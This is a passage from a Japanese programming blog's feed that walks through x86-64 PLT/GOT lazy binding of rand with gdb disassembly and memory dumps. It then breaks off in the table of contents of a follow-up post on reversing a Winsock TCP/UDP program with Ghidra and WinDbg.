&lt;p&gt;アセンブリソースから、関数を呼び出す&lt;code class=&quot;language-text&quot;&gt;call&lt;/code&gt;命令の箇所を抜粋しました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ disas main
Dump of assembler code &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; main:
   0x000000000040113e &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+1&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;3&lt;/span&gt;&gt;&lt;/span&gt;:	call   0x401126 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;test&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
   0x0000000000401146 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+2&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;:	call   0x401030 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;rand@plt&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
   0x000000000040114e &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+2&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;9&lt;/span&gt;&gt;&lt;/span&gt;:	call   0x401030 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;rand@plt&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;call&lt;/code&gt;命令は以下の2つの処理を組み合わせた処理を実行する命令です。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;call&lt;/code&gt;命令の次のアドレス(関数がreturnした後に実行する命令)をスタックにプッシュする&lt;/li&gt;
&lt;li&gt;呼び出し先の関数のアドレスにジャンプする&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://vanya.jp.net/os/x86call/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;x86アセンブリ言語での関数コール&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ここで、2つの&lt;code class=&quot;language-text&quot;&gt;call&lt;/code&gt;命令のアセンブリをそれぞれ出力してみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# 0x401126 &amp;lt;test&gt;&lt;/span&gt;
$ disas 0x401126
Dump of assembler code &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; test:
   0x0000000000401126 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;0&lt;/span&gt;&gt;&lt;/span&gt;:	push   rbp
   0x0000000000401127 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;:	mov    rbp,rsp
   0x000000000040112a &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;4&lt;/span&gt;&gt;&lt;/span&gt;:	mov    eax,0x0
   0x000000000040112f &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;9&lt;/span&gt;&gt;&lt;/span&gt;:	pop    rbp
   0x0000000000401130 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+1&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;0&lt;/span&gt;&gt;&lt;/span&gt;:	ret    
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# 0x401030 &amp;lt;rand@plt&gt;&lt;/span&gt;
$ disas 0x401030
Dump of assembler code &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; rand@plt:
   0x0000000000401030 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;0&lt;/span&gt;&gt;&lt;/span&gt;:	jmp    QWORD PTR &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;rip+0x2fe2&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;# 0x404018 &amp;lt;rand@got.plt&gt;&lt;/span&gt;
   0x0000000000401036 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;6&lt;/span&gt;&gt;&lt;/span&gt;:	push   0x0
   0x000000000040103b &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+1&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;:	jmp    0x401020
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これを見比べたときに、ユーザ関数の&lt;code class=&quot;language-text&quot;&gt;test&lt;/code&gt;は直接関数が&lt;code class=&quot;language-text&quot;&gt;call&lt;/code&gt;されているのに対して、&lt;code class=&quot;language-text&quot;&gt;rand&lt;/code&gt;を呼び出す際は&lt;code class=&quot;language-text&quot;&gt;rand@plt&lt;/code&gt;が呼び出されていることがわかります。&lt;/p&gt;
&lt;p&gt;そして、&lt;code class=&quot;language-text&quot;&gt;rand@plt&lt;/code&gt;が呼び出された場合は最初の&lt;code class=&quot;language-text&quot;&gt;JMP&lt;/code&gt;命令で&lt;code class=&quot;language-text&quot;&gt;rand@got.plt&lt;/code&gt;が呼び出されます。&lt;/p&gt;
&lt;p&gt;これはまだGOTに呼び出し先のアドレスが設定されていないためです。&lt;/p&gt;
&lt;h3 id=&quot;共有ライブラリ関数の呼び出し&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%85%B1%E6%9C%89%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E9%96%A2%E6%95%B0%E3%81%AE%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97&quot; aria-label=&quot;共有ライブラリ関数の呼び出し permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;共有ライブラリ関数の呼び出し&lt;/h3&gt;
&lt;p&gt;次に、1回目と2回目の&lt;code class=&quot;language-text&quot;&gt;rand&lt;/code&gt;関数の呼び出し点にそれぞれブレークポイントを設定して、PLTからGOTを経て共有ライブラリ関数のバインドが行われる前後のGOTの変化を見ていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ b *0x401146
$ b *0x40114e
$ run&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これで、1回目の&lt;code class=&quot;language-text&quot;&gt;rand&lt;/code&gt;関数の呼び出し点に到達しました。&lt;/p&gt;
&lt;p&gt;ここで、&lt;code class=&quot;language-text&quot;&gt;rand@plt&lt;/code&gt;のディスアセンブル結果から、対応するGOTのアドレスは&lt;code class=&quot;language-text&quot;&gt;0x404018&lt;/code&gt;であることがわかっています。&lt;/p&gt;
&lt;p&gt;つまり、最終的に&lt;code class=&quot;language-text&quot;&gt;0x404018&lt;/code&gt;に&lt;code class=&quot;language-text&quot;&gt;rand&lt;/code&gt;関数本体のアドレスが格納される想定になります。&lt;/p&gt;
&lt;p&gt;しかし、現時点ではまだ&lt;code class=&quot;language-text&quot;&gt;rand&lt;/code&gt;関数はプログラムの実行時に一度も呼び出されていないため、GOTには&lt;code class=&quot;language-text&quot;&gt;rand@plt+6&lt;/code&gt;のアドレスが格納されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ telescope 0x404018
0000&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x404018 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x401036 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;rand@plt+&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;6&lt;/span&gt;&gt;&lt;/span&gt;:	push   0x0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://gef.readthedocs.io/en/master/commands/dereference/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Command dereference - GEF - GDB Enhanced Features documentation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;rand@plt+6&lt;/code&gt;のアドレスの処理は、スタックに値(0x0)を積んだ後に&lt;code class=&quot;language-text&quot;&gt;0x401020&lt;/code&gt;へのジャンプを行っています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ disas 0x401030
Dump of assembler code &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; rand@plt:
   0x0000000000401030 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;0&lt;/span&gt;&gt;&lt;/span&gt;:	jmp    QWORD PTR &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;rip+0x2fe2&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;# 0x404018 &amp;lt;rand@got.plt&gt;&lt;/span&gt;
   0x0000000000401036 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;6&lt;/span&gt;&gt;&lt;/span&gt;:	push   0x0
   0x000000000040103b &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;+1&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;:	jmp    0x401020
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この後の処理は、以下のようにさらにスタックに値を格納した後、&lt;code class=&quot;language-text&quot;&gt;0x404010&lt;/code&gt;に格納されているアドレスにジャンプする処理が続きます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ x/16 0x401020
   0x401020:	push   QWORD PTR &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;rip+0x2fe2&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;# 0x404008&lt;/span&gt;
   0x401026:	jmp    QWORD PTR &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;rip+0x2fe4&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;# 0x404010&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;0x401036&lt;/code&gt;にブレークポイントを設定し、その後の処理を追ってみると次のようになりました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x401026:	jmp    QWORD PTR &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;rip+0x2fe4&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;# 0x404010&lt;/span&gt;
 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x40102c:	nop    DWORD PTR &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;rax+0x0&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x401030 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;rand@plt&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;:	jmp    QWORD PTR &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;rip+0x2fe2&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;# 0x404018 &amp;lt;rand@got.plt&gt;&lt;/span&gt;
 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x401036 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;rand@plt+&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;6&lt;/span&gt;&gt;&lt;/span&gt;:	push   0x0
 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x40103b &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;rand@plt+1&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;:	jmp    0x401020
 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;-&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;   0x7ffff7fe7bb0:	endbr64 
       0x7ffff7fe7bb4:	push   rbx
       0x7ffff7fe7bb5:	mov    rbx,rsp
       0x7ffff7fe7bb8:	and    rsp,0xffffffffffffffc0
       0x7ffff7fe7bbc:	sub    rsp,QWORD PTR &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;rip+0x14b45&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;# 0x7ffff7ffc708 &amp;lt;_rtld_global_ro+232&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで呼び出している関数は&lt;code class=&quot;language-text&quot;&gt;_dl_runtime_resolve&lt;/code&gt;です。&lt;/p&gt;
&lt;p&gt;詳しくは以下が参考になりました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://syst3mfailure.io/ret2dl_resolve&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Ret2dl_resolve x64&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;この関数では、呼び出し先の&lt;code class=&quot;language-text&quot;&gt;rand&lt;/code&gt;関数のアドレスを解決して、&lt;code class=&quot;language-text&quot;&gt;rand&lt;/code&gt;関数を呼び出します。&lt;/p&gt;
&lt;p&gt;この際にGOTが更新されるため、次回以降の&lt;code class=&quot;language-text&quot;&gt;rand&lt;/code&gt;関数の呼び出し時には、解決された&lt;code class=&quot;language-text&quot;&gt;rand&lt;/code&gt;関数のアドレスがGOTから直接呼び出されます。&lt;/p&gt;
&lt;p&gt;実際に2回目の&lt;code class=&quot;language-text&quot;&gt;rand&lt;/code&gt;関数の呼び出し時点で停止させ、先ほどと同じように&lt;code class=&quot;language-text&quot;&gt;rand@plt&lt;/code&gt;が参照するGOTの中身を確認すると、&lt;code class=&quot;language-text&quot;&gt;rand&lt;/code&gt;関数本体のアドレスが格納されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ telescope 0x404018
0000&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x404018 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x7ffff7e0de90 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;rand&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;:	endbr64&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;そのため、2回目の実行時には&lt;code class=&quot;language-text&quot;&gt;_dl_runtime_resolve&lt;/code&gt;は呼び出されず、直接&lt;code class=&quot;language-text&quot;&gt;rand&lt;/code&gt;関数が実行されます。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;UNIXのコードを読んでいたはずが、気づいたらGOTとPLTのことを調べてました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://amzn.to/3zwc6Y6&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解セキュリティコンテスト&lt;/a&gt;読むともっと詳しく書いてあったので、GOT Overwriteなども試しつつもう少し深掘りしてみようと思います。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3zwc6Y6&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解セキュリティコンテスト&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3n114Fn&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Debug Hacks -デバッグを極めるテクニック&amp;#x26;ツール&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Windows SocketsでTCP通信とUDP通信を実装したプログラムをリバーシングしてみる]]></title><link>https://kashiwaba-yuki.com/windows-windbg-010-socket</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windbg-010-socket</guid><pubDate>Sat, 01 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;リバースエンジニアリング能力向上とWinDbgのプロになるため、自作のモジュールをリバーシングしてます。&lt;/p&gt;
&lt;p&gt;今回は、C言語で実装したWindowsのソケット通信プログラムを解析していきます。&lt;/p&gt;
&lt;p&gt;※検証目的に作成したプログラムでエラー処理などは実装していないため実用性は担保しません。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E4%BB%8A%E5%9B%9E%E4%BD%9C%E6%88%90%E3%81%97%E3%81%9F%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0&quot;&gt;今回作成したプログラム&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#winsock2&quot;&gt;winsock2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#pragma-comment&quot;&gt;pragma comment()&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ws2tcpiph&quot;&gt;ws2tcpip.h&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#post%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%82%92%E9%80%81%E4%BF%A1%E3%81%99%E3%82%8B%E9%96%A2%E6%95%B0&quot;&gt;POSTリクエストを送信する関数&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#wsadata%E3%81%AE%E5%88%9D%E6%9C%9F%E5%8C%96&quot;&gt;WSADATAの初期化&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E9%80%9A%E4%BF%A1%E5%85%88%E3%81%AE%E6%8C%87%E5%AE%9A&quot;&gt;通信先の指定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#socket%E3%81%AE%E4%BD%9C%E6%88%90&quot;&gt;Socketの作成&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B3%E3%83%8D%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E7%A2%BA%E7%AB%8B&quot;&gt;コネクションの確立&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#http%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%81%AE%E9%80%81%E4%BF%A1&quot;&gt;HTTPリクエストの送信&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#udp%E9%80%9A%E4%BF%A1%E3%82%92%E8%A1%8C%E3%81%86%E9%96%A2%E6%95%B0&quot;&gt;UDP通信を行う関数&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E9%80%9A%E4%BF%A1%E3%81%AE%E7%A2%BA%E8%AA%8D&quot;&gt;通信の確認&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B7%E3%83%B3%E3%82%B0%E3%81%99%E3%82%8B&quot;&gt;リバーシングする&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ghidra%E3%81%A7%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E3%81%99%E3%82%8B&quot;&gt;Ghidraでデコンパイルする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#windbg%E3%81%A7ttd%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot;&gt;WinDbgでTTDトレースを取得する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#socket%E3%81%AE%E4%B8%AD%E8%BA%AB%E3%82%92%E8%BF%BD%E3%81%86&quot;&gt;Socketの中身を追う&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BD%9C%E6%88%90%E3%81%95%E3%82%8C%E3%81%9F%E3%82%BD%E3%82%B1%E3%83%83%E3%83%88&quot;&gt;作成されたソケット&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#sockaddr_in%E6%A7%8B%E9%80%A0%E4%BD%93%E3%82%92%E8%AA%AD%E3%82%80&quot;&gt;sockaddr_in構造体を読む&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;今回作成したプログラム&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%8A%E5%9B%9E%E4%BD%9C%E6%88%90%E3%81%97%E3%81%9F%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0&quot; aria-label=&quot;今回作成したプログラム permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 